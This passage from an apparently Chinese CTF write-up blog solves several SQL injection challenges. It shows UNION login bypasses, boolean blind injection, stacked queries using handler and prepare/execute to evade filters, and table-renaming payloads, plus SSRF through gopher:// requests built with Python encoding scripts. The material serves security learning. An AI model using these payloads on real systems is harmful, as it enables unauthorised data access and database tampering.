password&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>显然如果存在sql注入的话<code>username</code>将会是注入点，可以看出逻辑为：</p><p>从数据库的<code>users</code>表查名为用户输入的<code>username</code>的行中的<code>username</code>和<code>password</code>字段，将结果存入<code>row</code>数组中，如果用户输入的<code>password</code>等于数据库查到的<code>row.password</code>，也就是登陆成功，则执行一个<code>getFavColor()</code>方法</p><p>getFavColor():</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">getFavColor</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">username</span>) =&gt; &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>db.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;SELECT fav_color FROM users WHERE username=?&#x27;</span>, username, <span class="hljs-function">(<span class="hljs-params">err, row</span>) =&gt;</span> &#123;<br><span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(err);<br><span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(row.<span class="hljs-property">fav_color</span>);<br>&#125;);<br>&#125;);<br>&#125;;<br></code></pre></td></tr></table></figure><p>大概users里存着三个字段：username、password、fav_color。<code>getColor()</code>方法是当用户登陆成功后查询登录账户最喜欢的颜色并返回，题目要求使用admin登录，盲猜admin最喜欢的颜色就是flag啦（。</p><p>再回到登录验证部分。那么怎么样才能输入用户名”admin”，然后输入密码对应的是”admin”对应的密码呢？一开始陷入了这个思维陷阱没跳出来，实际上，可以这样：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">username:*&#x27; UNION <span class="hljs-keyword">SELECT</span> <span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;123&quot;</span><span class="hljs-comment">--+</span><br>password:<span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>用户名中的”*”指的是一个数据库中不存在的用户名，空着也行，然后单引号闭合。SELECT “admin” 和 “123”，最后”–+”闭合语句，这样一来整个sql语句的查询结果就变成了</p><table><thead><tr><th>username</th><th>password</th></tr></thead><tbody><tr><td>admin</td><td>123</td></tr></tbody></table><p>那么当用户输入密码为”123”自然就等于row.password了，登陆成功。</p><p>为便于理解，我们本地创建一个表<code>user_info</code>，表如下：</p><p><img src="/2023/02/09/SQLI/image-20230412122726143.png"></p><p>本地测试结果如下：</p><p><img src="/2023/02/09/SQLI/image-20230412123052991.png"></p><p>表中不存在”21112”的用户，因此此处无查询结果，联合查询利用select直接返回字符串。如果username填入已有用户，查询结果如下：</p><p><img src="/2023/02/09/SQLI/image-20230412123949128.png"></p><p>当然，要学会善于利用工具（，话不多说，上图</p><p><img src="/2023/02/09/SQLI/B041239C46DBC25E5C1727ACF80014FC.jpg"></p><p>这道题用sqlmap也能直接淦出来。厚礼蟹</p><hr><h2 id="BUUCTF-EasySql"><a href="#BUUCTF-EasySql" class="headerlink" title="BUUCTF-EasySql"></a>BUUCTF-EasySql</h2><p>先用用户名:<em><strong>1</strong></em>  密码:<em><strong>1’</strong></em>  测试注入，页面报错，可能存在注入点，并且是字符型。</p><p><img src="/2023/02/09/SQLI/image-20230213012236141.png"></p><p>密码传入***1’ order by 4 #***时报错，判断出数据库有三个字段。</p><p><img src="/2023/02/09/SQLI/image-20230213013114976.png"></p><p>准备爆数据库名，二分法传入***1’ or (ascii(substr(database(),0,1))&lt;128)#***，结果直接拿到了flag。</p><p><img src="/2023/02/09/SQLI/image-20230213013848916.png"></p><p>题后反思：因为传入***1’ or (ascii(substr(database(),0,1))&lt;128)#*<strong>导致后端查询语句变成</strong>select * from 数据库名 where username &#x3D; ‘1’ and pasword &#x3D;’1’  or (ascii(substr(database(),0,1))&lt;128)#’***因为and优先级高于or，于是整个句子变成了两个部分：</p><p><em><strong>select * from 数据库名 where username &#x3D; ‘1’ and pasword &#x3D;’1’</strong></em> 和</p><p><em><strong>or (ascii(substr(database(),0,1))&lt;128)#’</strong></em></p><p>虽然用户名密码判断是错的，但是数据库名的第一个字符的ascii码确实小于128，为真，二者用or相连，返回为true，故登陆成功获取到flag；</p><p>但是这样做实际上是走弯路了，这道题布尔盲注不是最优解，实际上直接构造密码为***1’ or 1&#x3D;1#***在原理上是和上面误打误撞拿到flag是一样的，但是少走了很多弯路。</p><hr><h2 id="BUUCTF-easy-sql"><a href="#BUUCTF-easy-sql" class="headerlink" title="BUUCTF-easy_sql"></a>BUUCTF-easy_sql</h2><p>先传入1，返回一个字符串，传入1’，报错</p><p><img src="/2023/02/09/SQLI/image-20230213133221152.png"></p><p>可能存在sql注入，并且是字符型的。传入***’ order by 4#***，报错。<img src="/2023/02/09/SQLI/image-20230213140043405.png"></p><p>传入***’ order by 3#<em><strong>，报错。传入</strong></em>‘ order by 2#***不报错，判断表里有2个字段。</p><p><img src="/2023/02/09/SQLI/image-20230213140715876.png"></p><p>联合查询尝试失败，select被ban。尝试构造无字母数字的语句。编写脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;s&#x27;</span>;<span class="hljs-comment">//依次将s改为e,l,e,c,t</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">256</span>;<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>^<span class="hljs-variable">$j</span>)==<span class="hljs-variable">$var</span>)&#123;<br>                <span class="hljs-keyword">echo</span> (<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>)).<span class="hljs-string">&quot;^&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$j</span>)));<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125; <br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>得到select，尝试能否绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(<span class="hljs-string">&#x27;%5D&#x27;</span>^<span class="hljs-string">&#x27;.&#x27;</span>).(<span class="hljs-string">&#x27;H&#x27;</span>^<span class="hljs-string">&#x27;-&#x27;</span>).(<span class="hljs-string">&#x27;%5D&#x27;</span>^<span class="hljs-string">&#x27;1&#x27;</span>).(<span class="hljs-string">&#x27;H&#x27;</span>^<span class="hljs-string">&#x27;-&#x27;</span>).(<span class="hljs-string">&#x27;_&#x27;</span>^<span class="hljs-string">&#x27;%3C&#x27;</span>).(<span class="hljs-string">&#x27;_&#x27;</span>^<span class="hljs-string">&#x27;%2B&#x27;</span>)<br></code></pre></td></tr></table></figure><p>还是没绕过，暂时放弃这条路。</p><p><img src="/2023/02/09/SQLI/image-20230213143545653.png"></p><p>查找学习show databases爆数据库名。<img src="/2023/02/09/SQLI/image-20230213144232143.png"></p><p>show tables爆表名，好臭的表名啊(。</p><p><img src="/2023/02/09/SQLI/image-20230213144433988.png"></p><p>‘; show columns from <code>1919810931114514</code>;#爆字段名（表名要用反引号引起来，typora里不知道为什么吞反引号）</p><p><img src="/2023/02/09/SQLI/image-20230213144916052.png"></p><p>万事俱备，只欠select，直接select不行，去查找能代替select的，果不其然，找到了handler语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler [表名] open;#打开表（句柄）<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">handler [表名] read first;#从表的第一列开始读（指针的起点）<br>handler [表名] read next;#指针往后一位，读取数据（参考资料https://blog.csdn.net/JesseYoung/article/details/40785137）<br></code></pre></td></tr></table></figure><p>最终构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;handler `1919810931114514` open;handler `1919810931114514` read first;#<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213152804918.png"></p><p>拿到flag。</p><p>反思：除了上面的方法寻找mysql中的其他查询语句外，看了大佬们的wp后学到了更多的思路和相关知识，这道题还可以通过预编译得到flag。</p><p>预编译相关语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set : #设置变量；<br>prepare : #准备一个语句赋予其名称，之后直接调用语句；<br>execute :#执行语句；<br></code></pre></td></tr></table></figure><p>以及一个mysql语句concat(str1,str2)，将str1与str2连接起来返回连接后的字符串；或者mysql的hex()函数把语句变成十六进制同样可以绕过select的过滤。</p><p>步骤如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);#创建一个变量@abc为字符串&quot;select * from `1919810931114514`&quot;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">prepare sel from @abc;#预备一个语句sel，内容是@abc，也就是&quot;select * from `1919810931114514`&quot;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">execute sel;#执行sel语句；<br></code></pre></td></tr></table></figure><p>构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213160841525.png"></p><p>然后提示set被ban了，但是用的是strstr()，区分大小写，所以大写绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#x27;;Set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213161126295.png"></p><p>十六进制绕过的步骤如下：</p><p>打开mysql命令行输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select hex(&quot;select * from `191981096114514`&quot;);<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213162154710.png"></p><p>得到一串十六进制字符串。</p><p>构造预处理语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">set @abc=73656C656374202A2066726F6D206031393139383130393631313435313460;prepare sel from @abc;execute sel;<br></code></pre></td></tr></table></figure><p>set同样大写绕过，payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;Set @abc=0x<span class="hljs-number">7365</span>6C<span class="hljs-number">65637420</span>2A<span class="hljs-number">206672</span>6F6D<span class="hljs-number">20603139313938</span><span class="hljs-number">31303933313131</span><span class="hljs-number">3435313460</span>;Prepare sel from @abc;execute sel;#<br>(上面的图里应该是<span class="hljs-number">19198109311451</span>4打错了，最终结果应该是上面这行代码//到底是谁起的这个名字啊啊啊啊啊)<br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213163140720.png"></p><p>GET到flag；</p><p>另外一种思路，从最开始看到题目的时候就在想直接输入1回显的数组是来自哪里的呢，但是最开始做的时候爆了191981093114514表就没爆words表的字段名了，因为191981093114514表里只有一个元素，所以推测回显内容是words表里的，爆words字段名</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&#x27;;show columns <span class="hljs-keyword">from</span> `<span class="hljs-built_in">words</span>`;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/09/SQLI/image-20230213164015355.png"></p><p>推测回显内容来自于data字段；</p><p>思路就是把words表改名为其他的名字，191981093114514改名为words，把其中的flag字段改名为id（或者在xinwords表里增加一列id），最后传入***1’ or 1&#x3D;1#***使查询结果为true爆出words所有字段内容。</p><p>相关语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">alter table [表名] add [字段名] int(***)/varchar(***) #增加列<br>alter table [表名] drop [字段名]#删除列<br>alter table [表名] change [字段名] [新字段名] int(***)/varchar(***)#重命名字段<br>alter table [表名] rename to [新表名]#重命名表,to可省略<br>rename table [表名] to [新表名]#重命名表<br></code></pre></td></tr></table></figure><p>payload1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;;rename table words to word;rename table `1919810931114514` to words;alter table words add id int(3);##新增一列id<br></code></pre></td></tr></table></figure><p>payload2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">1&#x27;;rename table words to word;rename table `1919810931114514` to words;alter table words change flag id varchar(50);#<br>#修改flag字段名为id<br></code></pre></td></tr></table></figure><hr><h2 id="2023ROIS冬令营internal"><a href="#2023ROIS冬令营internal" class="headerlink" title="2023ROIS冬令营internal"></a>2023ROIS冬令营internal</h2><p>这是什么，两个超链接，点一下（</p><p><img src="/2023/02/09/SQLI/image-20230410150245999.png"></p><p>​SQLI页面中的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try to access it from internal!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome!\n&quot;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(DB_HOST, DB_USER, DB_PASS, DB_DATABASE);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM messages WHERE id=<span class="hljs-subst">$id</span>&quot;</span>; <span class="hljs-comment">// SQLI &gt;_&lt;</span><br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>)[<span class="hljs-string">&#x27;message&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$message</span>;<br><span class="hljs-comment">#回显Try to access it from internal!</span><br></code></pre></td></tr></table></figure><p><code>if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== &#39;127.0.0.1&#39;)</code>用户访问的IP必须是本地IP才能进行下面的数据库操作等步骤，也就是说只有通过网页服务器内网访问。如果我们能够通过这个服务器中的另外一个不限制于内网访问的页面，把它当做跳板间接对这个仅内网访问的页面进行操作，就能进行传参等操作。也就是实现SSRF。先看另外一个页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Hint: Do you know gopher?</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file:|ftp:|http:|scp:|dict:/i&quot;</span>,<span class="hljs-variable">$url</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br></code></pre></td></tr></table></figure><p><code>curl_init()</code>函数初始化一个curl绘会话，值传给<code>$ch</code>，<code>curl_exec()</code>函数执行一个curl会话，值传给<code>$res</code>。最后将结果打印出来。既然可以执行curl，那么不就意味着可以通过这个页面对SQLI页面进行传参等操作了吗。给出了提示：<code>&quot;Do you know gopher?&quot;</code>。emmm。。。并不知道。那就学呗。找到了一篇<a href="https://zhuanlan.zhihu.com/p/112055947">讲的比较详细的文章</a>学习了一下。</p><p>gopher是啥？它是一种协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。</p><p>gopher协议的格式：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/_</span>后接<span class="hljs-title class_">TCP</span>数据流<br></code></pre></td></tr></table></figure><p>需要注意的是，TCP数据流必须是经过url编码的，并且回车和换行必须是<code>%0D%0A</code>，使用脚本或工具编码后回车换行会变成<code>%0A</code>，因此要多一步replace的步骤。在HTTP包的最后要加<code>%0D%0A</code>，代表消息结束（具体可研究HTTP包结束）。以下是通过gopher协议传参的一次示例：</p><p>GET请求：</p><p>准备好一个监听机和一个用户机：</p><p><img src="/2023/02/09/SQLI/image-20230410153558433.png"></p><p><code>nc -lp 1234</code>监听1234端口，使用curl发送http请求<code>curl gopher://172.17.0.1:1234/abcd</code>，监听机收到消息为”bcd”；发送请求<code>curl gopher://172.17.0.1:1234/aabcd</code>nc监听到abcd。因此紧跟在<code>&quot;&lt;PORT&gt;/&quot;</code>字符后面的一个字符会被忽略，可换为任意一个字符。</p><p><img src="/2023/02/09/SQLI/image-20230410182351129.png"></p><p>这是一段网页源码，作用是将GET传入的name的值打印出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个GET请求包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/ssrf.php?name=Potatowo</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.17.0.1<br>#回车<br></code></pre></td></tr></table></figure><p>经Python脚本编写，生成对应的请求包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;GET /ssrf.php?name=Margin HTTP/1.1</span><br><span class="hljs-string">Host: 172.17.0.1</span><br><span class="hljs-string">#该行要有回车，HTTP数据包结尾</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<span class="hljs-comment">#此处将&quot;%0A&quot;替换成&quot;%0D%0A&quot;</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A</span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>POST请求：</p><p>这是一段网页源码，功能不做过多赘述：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个POST请求包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ssrf/base/post.php</span> <span class="hljs-meta">HTTP/1.1</span><br>host:172.17.0.1<br>Content-Type:application/x-www-form-urlencoded<br>Content-Length:11<br><br><span class="language-ini"><span class="hljs-attr">name</span>=Potatowo</span><br><span class="language-ini"><span class="hljs-comment">#回车</span></span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_POST%20/ssrf/base/post.php%20HTTP/1.1%0D%0Ahost%3A172.17.0.1%0D%0AContent-Type%3Aapplication/x-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0Aname%3DPotatowo%0D%0A%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>现在回到本题；</p><p>既然用得到请求包，那就先bp抓包，对SQLI页面传参，那就抓SQLI页面的包：</p><p><img src="/2023/02/09/SQLI/image-20230410194114453.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1#使用脚本时删掉该注释，此处要把原包ip改为改为127.0.0.1</span><br><span class="hljs-string">Content-Length: 4</span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = result = urllib.parse.quote(result)<br><span class="hljs-comment">#要注意！！如果是希望在浏览器里传参，则要编码两次！！浏览器会自动解码一次，后端解码一次；但是像下面</span><br><span class="hljs-comment">#要讲的用python的requests库直接传参就只需要编码一次因为不需要经过浏览器解码</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%25204%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/109.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250Aid%253D1%250D%250A%250D%250A</span><br><br></code></pre></td></tr></table></figure><p>改为符合gopher协议的形式，注意由于<code>curl_exec()</code>的执行是在服务端里进行的，所以<code>gopher://</code>协议的地址应改为<code>127.0.0.1:80</code>，80端口是跑web服务的端口。</p><p><img src="/2023/02/09/SQLI/image-20230410201414804.png"></p><p>将脚本中的content进行修改，<code>content = &quot;id=1 and 1=1&quot;</code>，传入，结果：</p><p><img 